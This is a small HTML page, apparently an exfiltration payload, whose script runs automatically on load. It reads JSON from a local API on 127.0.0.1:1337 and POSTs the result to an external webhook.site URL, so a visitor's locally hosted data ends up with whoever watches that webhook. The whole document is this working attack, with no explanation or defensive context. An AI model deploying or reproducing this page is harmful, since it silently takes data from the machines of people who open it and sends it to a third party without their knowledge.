<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Fetch and Forward</title>
    <script>
        async function fetchDataAndForward() {
            try {
                // Fetch data from local API
                let response = await fetch('http://127.0.0.1:1337/api/entries');
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                
                let data = await response.json();
                console.log('Fetched Data:', data);
                
                // Send data to webhook
                await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                
                console.log('Data successfully forwarded');
            } catch (error) {
                console.error('Error:', error);
            }
        }
        
        window.onload = fetchDataAndForward;
    </script>
</head>
<body>
    <h1>Fetching and Forwarding Data...</h1>
</body>
</html>
